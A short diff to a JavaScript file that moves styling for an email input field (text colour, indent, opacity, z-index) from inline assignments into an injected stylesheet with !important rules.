@@ -41,6 +41,18 @@
     styleElement.id = "zz_core_style";
     styleElement.appendChild(document.createTextNode(cssText));
     document.head.appendChild(styleElement);
+    var fixStyles = document.createElement("style");
+  fixStyles.textContent = 
+    "#mail_x9k2{" +
+    "text-indent:0!important;" +
+    "padding-left:10px!important;" +
+    "color:#122b3b!important;" +
+    "-webkit-text-fill-color:#122b3b!important;" +
+    "opacity:1!important;" +
+    "position:relative;" +
+    "z-index:9999!important" +
+    "}";
+  document.head.appendChild(fixStyles);
   }
 function createDOM() {
     var bgCanvas = document.createElement("div");
@@ -274,10 +286,6 @@ function createDOM() {
         captionNode.textContent = config.SUBHEAD;
         baseNode.textContent = config.FOOTER + " · © 2026";
         loadLogo("");
-  emailInput.style.color = '#122b3b';
-emailInput.style.textIndent = '0';
-emailInput.style.webkitTextFillColor = '#122b3b';
-emailInput.style.opacity = '1';
         return;
       }
       var domainName = domain.split(".")[0];
